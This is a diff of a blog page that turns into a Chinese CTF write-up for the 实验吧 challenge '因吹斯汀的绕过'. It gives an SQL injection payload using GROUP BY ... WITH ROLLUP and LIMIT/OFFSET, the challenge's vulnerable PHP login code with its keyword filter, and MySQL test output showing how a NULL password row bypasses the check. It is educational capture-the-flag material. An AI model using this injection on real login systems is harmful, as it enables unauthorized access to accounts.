@@ -6,15 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2018/7 | welcome to my blogs</title>
+  <title>实验吧-因吹斯汀的绕过-writeup | welcome to my blogs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="welcome to my blogs">
-<meta property="og:url" content="http://yoursite.com/archives/2018/07/index.html">
+  <meta name="description" content="payload11&apos; or 1=1 group by pwd with rollup limit 1 offset 2 # 后台核心代码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧-因吹斯汀的绕过-writeup">
+<meta property="og:url" content="http://yoursite.com/2018/07/12/CTF-实验吧-interesting/index.html">
 <meta property="og:site_name" content="welcome to my blogs">
+<meta property="og:description" content="payload11&apos; or 1=1 group by pwd with rollup limit 1 offset 2 # 后台核心代码">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-07-14T12:33:48.335Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="welcome to my blogs">
+<meta name="twitter:title" content="实验吧-因吹斯汀的绕过-writeup">
+<meta name="twitter:description" content="payload11&apos; or 1=1 group by pwd with rollup limit 1 offset 2 # 后台核心代码">
   
     <link rel="alternative" href="/atom.xml" title="welcome to my blogs" type="application/atom+xml">
   
@@ -151,79 +155,64 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-CTF-实验吧-interesting" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/07/12/CTF-bugku-login2/" class="archive-article-date">
-  	<time datetime="2018-07-12T12:59:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-12</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/07/12/CTF-bugku-login2/">bugku-login2-witeup</a>
+    <h1 class="article-title" itemprop="name">
+      实验吧-因吹斯汀的绕过-writeup
     </h1>
   
 
 
 
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/CTF//" class="article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/07/12/CTF-实验吧-interesting/" class="archive-article-date">
+        
+        <a href="/2018/07/12/CTF-实验吧-interesting/" class="archive-article-date">
   	<time datetime="2018-07-12T12:10:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-12</time>
 </a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> group <span class="keyword">by</span> pwd <span class="keyword">with</span> rollup limit <span class="number">1</span> <span class="built_in">offset</span> <span class="number">2</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<h2 id="后台核心代码"><a href="#后台核心代码" class="headerlink" title="后台核心代码"></a>后台核心代码</h2><a id="more"></a>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"></span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>带入uname的值查询 如果查询结果的行的数目为1的话（查询成功）继续执行,如果输入的pwd和查询的pwd相同的话输出flag</p>
+<h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from demo where password = '' or 1=1;</span><br><span class="line">+<span class="comment">-------+----------+------+</span></span><br><span class="line">| name  | password | id   |</span><br><span class="line">+<span class="comment">-------+----------+------+</span></span><br><span class="line">| admin | admin888 |    1 |</span><br><span class="line">| user1 | pass2    |    2 |</span><br><span class="line">| user2 | pass3    |    3 |</span><br><span class="line">+<span class="comment">-------+----------+------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> demo <span class="keyword">where</span> <span class="keyword">password</span> = <span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">password</span> <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br><span class="line">+<span class="comment">-------+----------+------+</span></span><br><span class="line">| name  | password | id   |</span><br><span class="line">+<span class="comment">-------+----------+------+</span></span><br><span class="line">| admin | admin888 |    1 |</span><br><span class="line">| user1 | pass2    |    2 |</span><br><span class="line">| user2 | pass3    |    3 |</span><br><span class="line">| user2 | NULL     |    3 |</span><br><span class="line">+<span class="comment">-------+----------+------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<p>or 1=1可以返回所有的结果，而如果查询的结果超过两行，with rollup就会多返回一行，并且password（由group by 决定）为NULL，再加入limit 1就可以只返回一行，而用offset，表示返回哪一行，null结果是在最后一行插入的，所以offset要指向最后一行，但我们并不知道最后一行的行数是几，所以用二分法测试 超过行数的话就会返回empty set，也就是没有返回一行而查询失败，所以只要测试出最后null的行数，此时查询成功返回的就是任意的一个uname和password为NULL的结果，此时密码一项不填为空，null和null相等就可以得到flag<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from demo where password = '' or 1=1 group by password with rollup</span><br><span class="line">limit 1 offset 3;</span><br><span class="line">+<span class="comment">-------+----------+------+</span></span><br><span class="line">| name  | password | id   |</span><br><span class="line">+<span class="comment">-------+----------+------+</span></span><br><span class="line">| user2 | NULL     |    3 |</span><br><span class="line">+<span class="comment">-------+----------+------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>dark吉dark利，今van吃鸡<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/07/12/CTF-实验吧-interesting/">实验吧-因吹斯汀的绕过-writeup</a>
-    </h1>
-  
-
-
-
-        <div class="article-info info-on-right">
-          
-          
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -236,17 +225,167 @@
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/07/12/CTF-实验吧-interesting/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2018/07/12/CTF-bugku-login2/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          bugku-login2-witeup
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2018/06/21/CTF-SCTF2018/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SCTF2018伪wp</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后台核心代码"><span class="toc-number">2.</span> <span class="toc-text">后台核心代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地测试"><span class="toc-number">3.</span> <span class="toc-text">本地测试</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  <div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="CTF-实验吧-interesting" data-title="实验吧-因吹斯汀的绕过-writeup" data-url="http://yoursite.com/2018/07/12/CTF-实验吧-interesting/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+  
+  
+  
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: "http://yoursite.com/2018/07/12/CTF-实验吧-interesting/", 
+    sourceId: "CTF-实验吧-interesting",
+    productKey: "true",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
   
 
-    
+  
+  <div id="SOHUCS" sid="CTF-实验吧-interesting" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "true",
+        conf: "true"
+    });
+</script>
+</script>
+  
+
+  
+
+  
 
 
           </div>
@@ -270,8 +409,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
